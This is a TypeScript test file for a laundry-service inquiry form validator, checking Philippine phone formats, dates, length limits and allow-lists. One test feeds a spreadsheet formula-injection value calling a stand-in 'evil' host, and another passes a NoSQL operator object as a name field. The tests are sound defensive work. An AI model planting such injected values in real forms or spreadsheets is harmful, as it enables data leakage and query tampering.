import { test } from "node:test";
import assert from "node:assert/strict";
import { validateInquiry, LIMITS } from "../src/lib/validate.ts";

const valid = {
  name: "Juan Dela Cruz",
  phone: "0917 123 4567",
  email: "Juan@Example.com",
  service: "Wash & Fold",
  amount: "3 bags",
  serviceType: "Pickup",
  address: "12 Mabini St, Brgy. Uno",
  preferredDate: "2026-10-10",
  preferredTime: "Morning",
  message: "Please wash whites separately.",
};

test("accepts a complete inquiry and normalizes it", () => {
  const { valid: ok, values, errors } = validateInquiry(valid, { today: "2026-10-06" });
  assert.deepEqual(errors, {});
  assert.ok(ok);
  assert.equal(values.phone, "09171234567");
  assert.equal(values.email, "juan@example.com");
});

test("requires name, phone, service and service type", () => {
  const { errors } = validateInquiry({});
  assert.deepEqual(Object.keys(errors).sort(), ["name", "phone", "service", "serviceType"]);
  assert.equal(errors.name, "Please enter your full name.");
});

test("accepts Philippine mobile and landline formats", () => {
  for (const phone of ["09171234567", "+63 917 123 4567", "639171234567", "(02) 8123-4567", "032 123 4567"]) {
    assert.equal(validateInquiry({ ...valid, phone }).errors.phone, undefined, phone);
  }
});

test("rejects malformed phone numbers", () => {
  for (const phone of ["12345", "0917123456789", "abc", "+1 415 555 0100", "0917-ABC-4567"]) {
    assert.ok(validateInquiry({ ...valid, phone }).errors.phone, phone);
  }
});

test("email is optional but must be valid when given", () => {
  assert.equal(validateInquiry({ ...valid, email: "" }).errors.email, undefined);
  assert.ok(validateInquiry({ ...valid, email: "not-an-email" }).errors.email);
});

test("address is required for pickup or delivery, dropped for drop-off", () => {
  assert.ok(validateInquiry({ ...valid, address: "" }).errors.address);
  const dropOff = validateInquiry({ ...valid, serviceType: "Drop-off", address: "should not be stored" });
  assert.equal(dropOff.errors.address, undefined);
  assert.equal(dropOff.values.address, "");
});

test("rejects past and impossible dates", () => {
  assert.ok(validateInquiry({ ...valid, preferredDate: "2026-10-05" }, { today: "2026-10-06" }).errors.preferredDate);
  assert.ok(validateInquiry({ ...valid, preferredDate: "2026-02-30" }).errors.preferredDate);
  assert.ok(validateInquiry({ ...valid, preferredDate: "next week" }).errors.preferredDate);
});

test("enforces length limits", () => {
  const { errors } = validateInquiry({ ...valid, message: "x".repeat(LIMITS.message + 1) });
  assert.match(errors.message ?? "", /1000 characters/);
});

test("server allow-lists reject tampered options", () => {
  const allowed = { service: ["Wash & Fold"], serviceType: ["Drop-off", "Pickup"], preferredTime: ["Morning"] };
  const { errors } = validateInquiry(
    { ...valid, service: "=IMPORTXML(\"http://evil\")", serviceType: "Teleport", preferredTime: "3am" },
    { allowed },
  );
  assert.ok(errors.service && errors.serviceType && errors.preferredTime);
});

test("ignores non-string input and strips control characters", () => {
  const { values, errors } = validateInquiry({ ...valid, name: { $ne: 1 } as unknown as string, message: "hi\u0000there\u0007" });
  assert.ok(errors.name);
  assert.equal(values.message, "hithere");
});
